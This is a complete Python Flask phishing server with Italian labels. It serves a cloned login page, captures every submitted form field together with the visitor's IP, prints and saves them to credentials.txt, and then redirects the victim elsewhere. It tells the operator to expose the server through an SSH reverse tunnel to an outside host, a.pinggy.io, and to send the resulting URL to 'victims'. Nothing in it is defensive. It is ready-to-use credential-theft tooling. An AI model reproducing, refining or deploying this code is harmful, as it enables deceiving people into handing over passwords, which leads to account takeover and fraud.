#!/usr/bin/env python3
from flask import Flask, request, render_template_string, redirect
import os
from datetime import datetime

app = Flask(__name__)
PHISH_PORT = 5000
CREDENTIALS_FILE = "credentials.txt"


def log_credentials(data, victim_ip):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n{'=' * 60}")
    print(f"🎣  VITTIMA CATTURATA  🎣")
    print(f"🌐 IP: {victim_ip} | {timestamp}")
    for key, value in data.items():
        print(f"   {key}: {value}")
    print(f"{'=' * 60}")

    # Salva
    with open(CREDENTIALS_FILE, 'a') as f:
        f.write(f"[{timestamp}] {victim_ip}\n")
        for k, v in data.items():
            f.write(f"  {k}: {v}\n")
        f.write("-" * 50 + "\n")


@app.route('/')
def index():
    try:
        with open('templates/login.html', 'r', encoding='utf-8') as f:
            return render_template_string(f.read())
    except:
        return """
<!DOCTYPE html>
<html><body style="text-align:center;padding:50px;font-family:Arial;">
    <h1>🚀 PHISHING ATTIVO</h1>
    <p><b>✅</b> Clonazione OK</p>
    <p><b>🌐</b> localhost:5000</p>
    <p><b>🔗</b> ssh -R0:localhost:5000 a.pinggy.io</p>
    <hr>
    <small>Ctrl+C → nuovo target</small>
</body></html>
        """


@app.route('/login', methods=['POST'])
def capture_login():
    victim_ip = request.remote_addr
    form_data = request.form.to_dict()
    log_credentials(form_data, victim_ip)
    return redirect(form_data.get('redirect_url', 'https://google.com'))


@app.route('/static/<path:filename>')
def static_files(filename):
    return app.send_static_file(filename)


if __name__ == "__main__":
    if os.path.exists(CREDENTIALS_FILE):
        os.remove(CREDENTIALS_FILE)

    print("\n🚀 PHISHING SERVER PINGGY")
    print(f"🌐 http://localhost:{PHISH_PORT}")
    print(f"📁 {os.path.abspath(CREDENTIALS_FILE)}")
    print("\n🎣 PINGGY TUNNEL (NUOVO TERMINALE):")
    print("   ssh -R0:localhost:5000 a.pinggy.io")
    print("\n⏳ Server pronto! Invia URL Pinggy alle vittime\n")

    app.run(host='0.0.0.0', port=PHISH_PORT, debug=False)